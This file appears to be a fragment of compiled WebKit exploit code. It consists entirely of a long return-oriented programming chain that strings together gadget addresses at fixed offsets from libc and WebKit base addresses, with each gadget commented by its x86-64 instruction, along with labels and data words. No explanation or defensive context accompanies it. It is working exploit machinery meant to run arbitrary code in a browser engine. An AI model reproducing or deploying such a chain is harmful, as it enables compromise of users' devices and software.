set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1054592, //L138
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1054624, //L140
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1054576, //L137
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1054608, //L139
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L137:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L138:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L139:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L140:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1054720, //L142
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1054704, //L141
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L141:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L142:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L144:
db([65280, 0]); // 0xff00
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1054832, //L145
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L145:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14664103, //and rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L147:
db([8, 0]); // 0x8
set_gadget(libc_base+763368,); //pop rcx
//L148:
db([8, 0]); // 0x8
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1055016, //L150
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L150:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1055072, //L151
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L151:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1055200, //L154
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L153:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L154:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1055288, //L156
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1055304, //L157
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L156:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L157:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1055464, //L160
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1055496, //L162
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1055448, //L159
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1055480, //L161
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L159:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L160:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L161:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L162:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1055592, //L164
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1055576, //L163
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L163:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L164:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L165:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L166:
db([24, 0]); // 0x18
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1055744, //L168
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L168:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1055800, //L169
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L169:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760, //pop rsi
ropchain+1055936, //L173
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1055904, //L171
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L171:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L172:
db([32, 0]); // 0x20
set_gadget(libc_base+759608,); //pop rax
//L173:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1056072, //L175
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1056088, //L176
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1056056, //L174
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L174:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L175:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1056192, //L177
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1056208, //L178
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L177:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1056328, //L179
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1056312, //L180
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L180:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L179:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1056416, //L182
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1056400, //L181
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L181:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L182:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1056520, //L183
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1056536, //L184
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L183:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1056656, //L185
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1056640, //L186
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L186:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L185:
db([0, 0]); // 0x0
//___builtin_bswap64:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1056728, //L187
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L187:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1056792, //L189
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L189:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([16, 0]); // 0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1056888, //L192
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L191:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L192:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1056960, //L195
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L194:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L195:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L197:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L198:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1057080, //L201
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L200:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L201:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+3488438, //mov [rax], ecx
libc_base+764760, //pop rsi
ropchain+1057136, //L203
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L203:
db([0, 0]); // 0x0
//L202:
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1057200, //L206
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L205:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L206:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1057288, //L208
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1057304, //L209
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L208:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L209:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1057464, //L212
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1057496, //L214
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1057448, //L211
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1057480, //L213
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L211:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L212:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L213:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L214:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1057576, //L215
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1057592, //L216
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L215:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L216:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1057688, //L218
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1057672, //L217
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L217:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L218:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1057768, //L219
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L219:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L220:
db([4, 0]); // 0x4
set_gadget(libc_base+759608,); //pop rax
//L221:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1057928, //L223
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1057944, //L224
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1057912, //L222
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L222:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L223:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L224:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+6378709, //cmp rax, rcx ; sete al
webkit_base+5168252, //setl al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1058120, //L226
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1058136, //L227
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1058104, //L225
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L225:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L226:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L227:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1058248, //L229
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1058296, //L232
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1058264, //L230
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L229:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L230:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L231:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L232:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1058408, //L233+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1058400, //L233
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L233:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1058424, //L233+24
ropchain+1058440, //L228
libc_base+782311, //pop rsp
ropchain+1058456, //L234
//L228:
libc_base+782311, //pop rsp
ropchain+1069056, //L235
//L234:
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L236:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L237:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1058576, //L239
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1058592, //L240
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L239:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L240:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1058736, //L244
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1058704, //L242
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1058720, //L243
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L242:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L243:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L244:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1058808, //L246
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L246:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1058864, //L247
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L247:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L249:
db([7, 0]); // 0x7
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1059008, //L251
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L250:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L251:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1059096, //L253
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1059112, //L254
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L253:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L254:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1059272, //L257
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1059304, //L259
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1059256, //L256
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1059288, //L258
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L256:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L257:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L258:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L259:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1059432, //L261
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1059448, //L262
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1059416, //L260
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L260:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L261:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L262:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1059560, //L263
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1059576, //L264
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L263:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1059664, //L266
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L266:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1059720, //L267
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L267:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1059848, //L269
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1059880, //L271
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1059864, //L270
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L269:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L270:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L271:
db([0, 0]); // 0x0
set_gadgets([
libc_base+223440, //mov al, [rdi]
libc_base+764760, //pop rsi
ropchain+1060040, //L275
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1059992, //L272
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1060008, //L273
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L272:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L273:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L274:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L275:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1060096, //L276
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L276:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1060208, //L278
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1060240, //L280
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1060224, //L279
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L278:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L279:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L280:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1060400, //L284
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1060352, //L281
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1060368, //L282
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L281:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L282:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L283:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L284:
